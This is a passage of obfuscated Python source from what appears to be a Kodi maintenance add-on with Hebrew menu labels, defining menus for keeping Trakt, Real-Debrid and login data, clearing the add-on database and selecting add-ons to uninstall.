	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO0OO0000O0OO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3447
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O00OO000O00O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3448
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO00O00O00OO00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3449
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0000O000O000000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3450
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0000O0O0OOOO000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3451
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0O00O0000OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3452
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO0OOO00O0OO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3453
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO0OOO000OO0OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3454
def Menu ():#line:3455
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3456
def saveMenu ():#line:3458
	O00OOOOOOOOO0O0OO ='[COLOR yellow]מופעל[/COLOR]';OOOOOOO0OO0O0000O ='[COLOR blue]מבוטל[/COLOR]'#line:3460
	O0OO0OO0OOO0O000O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3461
	OOOOOO0OOOOOOO000 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3462
	OOOO0O00O000000OO ='true'if KEEPINFO =='true'else 'false'#line:3463
	O000O0OOOOOOOO000 ='true'if KEEPSOUND =='true'else 'false'#line:3465
	OOO00OO0O00O00O00 ='true'if KEEPVIEW =='true'else 'false'#line:3466
	O0OO000OOOO0OO000 ='true'if KEEPSKIN =='true'else 'false'#line:3467
	OOOOO00OOO0000OO0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3468
	OO00OO0OO00OOOOOO ='true'if KEEPSKIN3 =='true'else 'false'#line:3469
	OOO00O000O0000OO0 ='true'if KEEPADDONS =='true'else 'false'#line:3470
	OOOO000000O000O0O ='true'if KEEPPVR =='true'else 'false'#line:3471
	O0OOOOO0O0O0000OO ='true'if KEEPTVLIST =='true'else 'false'#line:3472
	OO00O0O0O0O0OO0O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3473
	O0OOO0000OOOO0000 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3474
	O00OOOO0OO000O00O ='true'if KEEPHUBTV =='true'else 'false'#line:3475
	O00O000OO0O00O000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3476
	OOOOOO0O0O00O000O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3477
	OO000OO00O000000O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3478
	OOO0O000OO000OO00 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3479
	OOO00O0O000O000OO ='true'if KEEPHUBMENU =='true'else 'false'#line:3480
	OOO00OO00OOO00O00 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3481
	O00OO0OOO00O0OO0O ='true'if KEEPTRAKT =='true'else 'false'#line:3482
	O00OO000O0O00OOO0 ='true'if KEEPREAL =='true'else 'false'#line:3483
	O0OOOO00OOO0O0OOO ='true'if KEEPRD2 =='true'else 'false'#line:3484
	O00O00O000OO0OO0O ='true'if KEEPTORNET =='true'else 'true'#line:3485
	O0OOO0000OOO000OO ='true'if KEEPLOGIN =='true'else 'false'#line:3486
	O0OO00OOOO0O0OOOO ='true'if KEEPSOURCES =='true'else 'false'#line:3487
	O0O000O0O0OO00OO0 ='true'if KEEPADVANCED =='true'else 'false'#line:3488
	OOOOOOO00OO00OOO0 ='true'if KEEPPROFILES =='true'else 'false'#line:3489
	OO00O0000O000OOOO ='true'if KEEPFAVS =='true'else 'false'#line:3490
	O0OO0000O00O00OOO ='true'if KEEPREPOS =='true'else 'false'#line:3491
	O00000OOOOO00O0O0 ='true'if KEEPSUPER =='true'else 'false'#line:3492
	O0000OO0O0OO00OO0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3493
	O00OOOOO0O0O0OOO0 ='true'if KEEPWEATHER =='true'else 'false'#line:3494
	O0O0O0O0O0OO00OOO ='true'if KEEPVICTORY =='true'else 'false'#line:3495
	O00000OO00O00O0OO ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3496
	if O0000OO0O0OO00OO0 =='true':#line:3498
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3499
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3500
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3501
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3502
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3503
	addFile ('%s שמירת חשבון RD:  '%O00OO000O0O00OOO0 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3506
	addFile ('%s שמירת חשבון טראקט:  '%O00OO0OOO00O0OO0O .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3507
	addFile ('%s שמירת מועדפים:  '%OO00O0000O000OOOO .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3510
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOOO000000O000O0O .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3511
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0O0O0O0O0OO00OOO .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3512
	addFile ('%s שמירת חשבון טלמדיה:  '%O00000OO00O00O0OO .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3513
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0OOOOO0O0O0000OO .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3514
	addFile ('%s שמירת אריח סרטים:  '%OO00O0O0O0O0OO0O0 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3515
	addFile ('%s שמירת אריח סדרות:  '%O0OOO0000OOOO0000 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3516
	addFile ('%s שמירת אריח טלויזיה:  '%O00OOOO0OO000O00O .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3517
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O00O000OO0O00O000 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3518
	addFile ('%s שמירת אריח ספורט:  '%OOOOOO0O0O00O000O .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3519
	addFile ('%s שמירת אריח ילדים:  '%OO000OO00O000000O .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3520
	addFile ('%s שמירת אריח מוסיקה:  '%OOO0O000OO000OO00 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3521
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOO00O0O000O000OO .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3522
	addFile ('%s שמירת כל האריחים בסקין:  '%O0OO000OOOO0OO000 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3523
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O00OOOOO0O0O0OOO0 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3524
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OOO00O000O0000OO0 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3530
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OOOO0O00O000000OO .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3531
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOOOOO0OOOOOOO000 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3534
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0OO00OOOO0O0OOOO .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3535
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O000O0OOOOOOOO000 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3536
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OOO00OO0O00O00O00 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3538
	addFile ('%s שמירת פליליסט לאודר:  '%OOO00OO00OOO00O00 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3539
	addFile ('%s שמירת הגדרות באפר: '%O0O000O0O0OO00OO0 .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3544
	addFile ('%s שמירת רשימות ריפו:  '%O0OO0000O00O00OOO .replace ('true',O00OOOOOOOOO0O0OO ).replace ('false',OOOOOOO0OO0O0000O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3546
	setView ('files','viewType')#line:3548
def traktMenu ():#line:3550
	O00O00O0OO00O00OO ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3551
	OO0OOO0O00000OO00 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3552
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3553
	addFile ('Save Trakt Data: %s'%O00O00O0OO00O00OO ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3554
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO0OOO0O00000OO00 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3555
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3556
	for O00O00O0OO00O00OO in traktit .ORDER :#line:3558
		O00OOOO0O0OOO0000 =TRAKTID [O00O00O0OO00O00OO ]['name']#line:3559
		O000OOOOOO0O00O0O =TRAKTID [O00O00O0OO00O00OO ]['path']#line:3560
		OOOOOO00OO0O00O00 =TRAKTID [O00O00O0OO00O00OO ]['saved']#line:3561
		OOOO00O0O0O00OOO0 =TRAKTID [O00O00O0OO00O00OO ]['file']#line:3562
		O00000O00O0O00OOO =wiz .getS (OOOOOO00OO0O00O00 )#line:3563
		OO00OO0OOO00O0OOO =traktit .traktUser (O00O00O0OO00O00OO )#line:3564
		OOO0OO0O000OO0O0O =TRAKTID [O00O00O0OO00O00OO ]['icon']if os .path .exists (O000OOOOOO0O00O0O )else ICONTRAKT #line:3565
		O0OOO0OO0000OO0O0 =TRAKTID [O00O00O0OO00O00OO ]['fanart']if os .path .exists (O000OOOOOO0O00O0O )else FANART #line:3566
		OOOO000OOOO0O00O0 =createMenu ('saveaddon','Trakt',O00O00O0OO00O00OO )#line:3567
		O00OOO00O00OOOO00 =createMenu ('save','Trakt',O00O00O0OO00O00OO )#line:3568
		OOOO000OOOO0O00O0 .append ((THEME2 %'%s Settings'%O00OOOO0O0OOO0000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00O00O0OO00O00OO )))#line:3569
		addFile ('[+]-> %s'%O00OOOO0O0OOO0000 ,'',icon =OOO0OO0O000OO0O0O ,fanart =O0OOO0OO0000OO0O0 ,themeit =THEME3 )#line:3571
		if not os .path .exists (O000OOOOOO0O00O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO0OO0O000OO0O0O ,fanart =O0OOO0OO0000OO0O0 ,menu =OOOO000OOOO0O00O0 )#line:3572
		elif not OO00OO0OOO00O0OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00O00O0OO00O00OO ,icon =OOO0OO0O000OO0O0O ,fanart =O0OOO0OO0000OO0O0 ,menu =OOOO000OOOO0O00O0 )#line:3573
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00OO0OOO00O0OOO ,'authtrakt',O00O00O0OO00O00OO ,icon =OOO0OO0O000OO0O0O ,fanart =O0OOO0OO0000OO0O0 ,menu =OOOO000OOOO0O00O0 )#line:3574
		if O00000O00O0O00OOO =="":#line:3575
			if os .path .exists (OOOO00O0O0O00OOO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00O00O0OO00O00OO ,icon =OOO0OO0O000OO0O0O ,fanart =O0OOO0OO0000OO0O0 ,menu =O00OOO00O00OOOO00 )#line:3576
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00O00O0OO00O00OO ,icon =OOO0OO0O000OO0O0O ,fanart =O0OOO0OO0000OO0O0 ,menu =O00OOO00O00OOOO00 )#line:3577
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00000O00O0O00OOO ,'',icon =OOO0OO0O000OO0O0O ,fanart =O0OOO0OO0000OO0O0 ,menu =O00OOO00O00OOOO00 )#line:3578
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3580
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3581
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3582
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3583
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3584
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3585
	setView ('files','viewType')#line:3586
def realMenu ():#line:3588
	O000O00O0OOO0O0OO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3589
	O00000000O00OO0OO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3590
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3591
	addFile ('Save Real Debrid Data: %s'%O000O00O0OOO0O0OO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3592
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O00000000O00OO0OO ),'',icon =ICONREAL ,themeit =THEME3 )#line:3593
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3594
	for O00OOO0OO000OOOOO in debridit .ORDER :#line:3596
		O00OO0OOOO0O000OO =DEBRIDID [O00OOO0OO000OOOOO ]['name']#line:3597
		OO000000O0O0OOO00 =DEBRIDID [O00OOO0OO000OOOOO ]['path']#line:3598
		O0OO00O0O00O0O0OO =DEBRIDID [O00OOO0OO000OOOOO ]['saved']#line:3599
		O0O000O0O0O00O0O0 =DEBRIDID [O00OOO0OO000OOOOO ]['file']#line:3600
		OOOO0OO00O0OOO00O =wiz .getS (O0OO00O0O00O0O0OO )#line:3601
		O0O000O0OOO0OO00O =debridit .debridUser (O00OOO0OO000OOOOO )#line:3602
		OO00O00O000OO000O =DEBRIDID [O00OOO0OO000OOOOO ]['icon']if os .path .exists (OO000000O0O0OOO00 )else ICONREAL #line:3603
		OO0OOOOOOO0OO0O0O =DEBRIDID [O00OOO0OO000OOOOO ]['fanart']if os .path .exists (OO000000O0O0OOO00 )else FANART #line:3604
		O0O00OOOO00OOOO0O =createMenu ('saveaddon','Debrid',O00OOO0OO000OOOOO )#line:3605
		O0O0OO000OO00OO0O =createMenu ('save','Debrid',O00OOO0OO000OOOOO )#line:3606
		O0O00OOOO00OOOO0O .append ((THEME2 %'%s Settings'%O00OO0OOOO0O000OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O00OOO0OO000OOOOO )))#line:3607
		addFile ('[+]-> %s'%O00OO0OOOO0O000OO ,'',icon =OO00O00O000OO000O ,fanart =OO0OOOOOOO0OO0O0O ,themeit =THEME3 )#line:3609
		if not os .path .exists (OO000000O0O0OOO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00O00O000OO000O ,fanart =OO0OOOOOOO0OO0O0O ,menu =O0O00OOOO00OOOO0O )#line:3610
		elif not O0O000O0OOO0OO00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O00OOO0OO000OOOOO ,icon =OO00O00O000OO000O ,fanart =OO0OOOOOOO0OO0O0O ,menu =O0O00OOOO00OOOO0O )#line:3611
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O000O0OOO0OO00O ,'authdebrid',O00OOO0OO000OOOOO ,icon =OO00O00O000OO000O ,fanart =OO0OOOOOOO0OO0O0O ,menu =O0O00OOOO00OOOO0O )#line:3612
		if OOOO0OO00O0OOO00O =="":#line:3613
			if os .path .exists (O0O000O0O0O00O0O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O00OOO0OO000OOOOO ,icon =OO00O00O000OO000O ,fanart =OO0OOOOOOO0OO0O0O ,menu =O0O0OO000OO00OO0O )#line:3614
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O00OOO0OO000OOOOO ,icon =OO00O00O000OO000O ,fanart =OO0OOOOOOO0OO0O0O ,menu =O0O0OO000OO00OO0O )#line:3615
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOO0OO00O0OOO00O ,'',icon =OO00O00O000OO000O ,fanart =OO0OOOOOOO0OO0O0O ,menu =O0O0OO000OO00OO0O )#line:3616
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3618
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3619
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3620
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3621
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3622
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3623
	setView ('files','viewType')#line:3624
def loginMenu ():#line:3626
	OOO0000O0O00OO000 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3627
	OO0O0OOO000O0OOOO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3628
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3629
	addFile ('Save Login Data: %s'%OOO0000O0O00OO000 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3630
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OO0O0OOO000O0OOOO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3631
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3632
	for OOO0000O0O00OO000 in loginit .ORDER :#line:3634
		OO00O0OOO0OO0OO00 =LOGINID [OOO0000O0O00OO000 ]['name']#line:3635
		O0OOO0000OOO0OOOO =LOGINID [OOO0000O0O00OO000 ]['path']#line:3636
		O000OOO0O00O00O0O =LOGINID [OOO0000O0O00OO000 ]['saved']#line:3637
		O000O0OOO0000OOOO =LOGINID [OOO0000O0O00OO000 ]['file']#line:3638
		OOO000OO000O0OOO0 =wiz .getS (O000OOO0O00O00O0O )#line:3639
		OO00OO0OO000O0O00 =loginit .loginUser (OOO0000O0O00OO000 )#line:3640
		O000OO0OO0O000000 =LOGINID [OOO0000O0O00OO000 ]['icon']if os .path .exists (O0OOO0000OOO0OOOO )else ICONLOGIN #line:3641
		O0OOO0OO00OOO0O0O =LOGINID [OOO0000O0O00OO000 ]['fanart']if os .path .exists (O0OOO0000OOO0OOOO )else FANART #line:3642
		OO00OO00OOO00O0OO =createMenu ('saveaddon','Login',OOO0000O0O00OO000 )#line:3643
		O00OO00O0O0OO0O00 =createMenu ('save','Login',OOO0000O0O00OO000 )#line:3644
		OO00OO00OOO00O0OO .append ((THEME2 %'%s Settings'%OO00O0OOO0OO0OO00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOO0000O0O00OO000 )))#line:3645
		addFile ('[+]-> %s'%OO00O0OOO0OO0OO00 ,'',icon =O000OO0OO0O000000 ,fanart =O0OOO0OO00OOO0O0O ,themeit =THEME3 )#line:3647
		if not os .path .exists (O0OOO0000OOO0OOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000OO0OO0O000000 ,fanart =O0OOO0OO00OOO0O0O ,menu =OO00OO00OOO00O0OO )#line:3648
		elif not OO00OO0OO000O0O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOO0000O0O00OO000 ,icon =O000OO0OO0O000000 ,fanart =O0OOO0OO00OOO0O0O ,menu =OO00OO00OOO00O0OO )#line:3649
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00OO0OO000O0O00 ,'authlogin',OOO0000O0O00OO000 ,icon =O000OO0OO0O000000 ,fanart =O0OOO0OO00OOO0O0O ,menu =OO00OO00OOO00O0OO )#line:3650
		if OOO000OO000O0OOO0 =="":#line:3651
			if os .path .exists (O000O0OOO0000OOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOO0000O0O00OO000 ,icon =O000OO0OO0O000000 ,fanart =O0OOO0OO00OOO0O0O ,menu =O00OO00O0O0OO0O00 )#line:3652
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOO0000O0O00OO000 ,icon =O000OO0OO0O000000 ,fanart =O0OOO0OO00OOO0O0O ,menu =O00OO00O0O0OO0O00 )#line:3653
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO000OO000O0OOO0 ,'',icon =O000OO0OO0O000000 ,fanart =O0OOO0OO00OOO0O0O ,menu =O00OO00O0O0OO0O00 )#line:3654
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3656
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3657
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3658
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3659
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3660
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3661
	setView ('files','viewType')#line:3662
def fixUpdate ():#line:3664
	if KODIV <17 :#line:3665
		OO0000O0O0OOOO0O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3666
		try :#line:3667
			os .remove (OO0000O0O0OOOO0O0 )#line:3668
		except Exception as OOO0O0O0000000O00 :#line:3669
			wiz .log ("Unable to remove %s, Purging DB"%OO0000O0O0OOOO0O0 )#line:3670
			wiz .purgeDb (OO0000O0O0OOOO0O0 )#line:3671
	else :#line:3672
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3673
def removeAddonMenu ():#line:3675
	OOO0O0000OO00OO00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3676
	OO0O00OOO0OOO0000 =[];O00O00OO000OOO0O0 =[]#line:3677
	for O000OO000000OOO0O in sorted (OOO0O0000OO00OO00 ,key =lambda O00O0O00O0O00OOO0 :O00O0O00O0O00OOO0 ):#line:3678
		O0OO000O00000O0O0 =os .path .split (O000OO000000OOO0O [:-1 ])[1 ]#line:3679
		if O0OO000O00000O0O0 in EXCLUDES :continue #line:3680
		elif O0OO000O00000O0O0 in DEFAULTPLUGINS :continue #line:3681
		elif O0OO000O00000O0O0 =='packages':continue #line:3682
		O00000000O0000O0O =os .path .join (O000OO000000OOO0O ,'addon.xml')#line:3683
		if os .path .exists (O00000000O0000O0O ):#line:3684
			O00O000O0O0OOO0OO =open (O00000000O0000O0O )#line:3685
			O0O0000O00OOO0000 =O00O000O0O0OOO0OO .read ()#line:3686
			OO0O00O000OOO0OOO =wiz .parseDOM (O0O0000O00OOO0000 ,'addon',ret ='id')#line:3687
			OOOO00O0O00O000OO =O0OO000O00000O0O0 if len (OO0O00O000OOO0OOO )==0 else OO0O00O000OOO0OOO [0 ]#line:3689
			try :#line:3690
				O00OOO0O0000OO000 =xbmcaddon .Addon (id =OOOO00O0O00O000OO )#line:3691
				OO0O00OOO0OOO0000 .append (O00OOO0O0000OO000 .getAddonInfo ('name'))#line:3692
				O00O00OO000OOO0O0 .append (OOOO00O0O00O000OO )#line:3693
			except :#line:3694
				pass #line:3695
	if len (OO0O00OOO0OOO0000 )==0 :#line:3696
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3697
		return #line:3698
	if KODIV >16 :#line:3699
		OO0O0000O00O00OO0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0O00OOO0OOO0000 )#line:3700
	else :#line:3701
		OO0O0000O00O00OO0 =[];O00OOOOO00OOOOOOO =0 #line:3702
		OO00OOOOOOO0O00OO =["-- Click here to Continue --"]+OO0O00OOO0OOO0000 #line:3703
		while not O00OOOOO00OOOOOOO ==-1 :#line:3704
			O00OOOOO00OOOOOOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00OOOOOOO0O00OO )#line:3705
			if O00OOOOO00OOOOOOO ==-1 :break #line:3706
			elif O00OOOOO00OOOOOOO ==0 :break #line:3707
			else :#line:3708
				OO00O0OOOOO00000O =(O00OOOOO00OOOOOOO -1 )#line:3709
				if OO00O0OOOOO00000O in OO0O0000O00O00OO0 :#line:3710
					OO0O0000O00O00OO0 .remove (OO00O0OOOOO00000O )#line:3711
